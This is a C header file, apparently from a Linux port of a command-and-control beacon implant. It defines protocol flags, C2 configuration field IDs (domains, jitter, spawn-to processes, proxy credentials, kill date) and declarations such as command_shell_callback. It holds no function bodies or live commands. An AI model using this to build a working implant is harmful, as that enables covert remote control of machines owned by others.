#ifndef LINUX_BEACON_H
#define LINUX_BEACON_H

#include <stdint.h>
#include <stddef.h>

/* Protocol bits — match official beacon.h */
#define BEACON_PROTO_HTTP         0x00
#define BEACON_PROTO_DNS          0x01
#define BEACON_PROTO_SMB          0x02
#define BEACON_PROTO_TCP_REVERSE  0x04
#define BEACON_PROTO_HTTPS        0x08
#define BEACON_PROTO_TCP_BIND     0x10

#define IS_HTTPS ( (setting_short(SETTING_PROTOCOL) & BEACON_PROTO_HTTPS) == BEACON_PROTO_HTTPS )

/* Setting field IDs */
#define SETTING_PROTOCOL   1
#define SETTING_PORT       2
#define SETTING_SLEEPTIME  3
#define SETTING_MAXGET     4
#define SETTING_JITTER     5
#define SETTING_MAXDNS     6
#define SETTING_PUBKEY     7
#define SETTING_DOMAINS    8
#define SETTING_USERAGENT  9
#define SETTING_SUBMITURI  10
#define SETTING_C2_RECOVER 11
#define SETTING_C2_REQUEST 12
#define SETTING_C2_POSTREQ 13
#define SETTING_PIPENAME   15
#define SETTING_DNS_IDLE       19
#define SETTING_DNS_SLEEP      20
#define SETTING_C2_VERB_GET    26
#define SETTING_C2_VERB_POST   27
#define SETTING_C2_CHUNK_POST  28
#define SETTING_SPAWNTO_X86    29
#define SETTING_SPAWNTO_X64    30
#define SETTING_CRYPTO_SCHEME  31
#define SETTING_PROXY_CONFIG   32
#define SETTING_PROXY_USER     33
#define SETTING_PROXY_PASSWORD 34
#define SETTING_PROXY_BEHAVIOR 35
#define SETTING_WATERMARK_HASH 36
#define SETTING_WATERMARK      37
#define SETTING_CLEANUP        38
#define SETTING_CFG_CAUTION    39
#define SETTING_KILLDATE       40
#define SETTING_HOST_HEADER    54
#define SETTING_HTTP_NO_COOKIES 50
#define SETTING_HEADERS_REMOVE 59
#define SETTING_DNS_BEACON_BEACON 60
#define SETTING_DOMAIN_STRATEGY 67
#define SETTING_DOMAIN_STRATEGY_SECONDS 68
#define SETTING_DOMAIN_STRATEGY_FAIL_X  69
#define SETTING_DOMAIN_STRATEGY_FAIL_SECONDS 70
#define SETTING_MAX_RETRY_STRATEGY_ATTEMPTS 71
#define SETTING_MAX_RETRY_STRATEGY_INCREASE 72
#define SETTING_MAX_RETRY_STRATEGY_DURATION 73

#define CRYPTO_LICENSED_PRODUCT 0
#define CRYPTO_TRIAL_PRODUCT    1

#define METADATA_FLAG_NOTHING    1
#define METADATA_FLAG_AGENT_X64  2
#define METADATA_FLAG_TARGET_X64 4
#define METADATA_FLAG_ADMIN      8

#define KEY_SIZE  16
#define HASH_SIZE 32
#define HMAC_SIZE 16
#define PATCH_SIZE 4096

typedef struct {
    int  myid;
    int  length;
    char data[1024];
} sessdata;

unsigned short setting_short(int field);
unsigned int   setting_int(int field);
char *         setting_ptr(int field);
unsigned int   setting_len(int field);
void           settings_init(void);

void beacon_main(void);
void process_payload(char *buffer, unsigned int length);
void command_shell_callback(char *buffer, int length, int type);
void agent_init(char *buffer, unsigned int max);

unsigned int bigger_rand(void);
unsigned int genagentid(void);

extern sessdata bigsession;
extern unsigned int agentid;
extern unsigned int sleep_time;
extern unsigned int jitter;

#endif
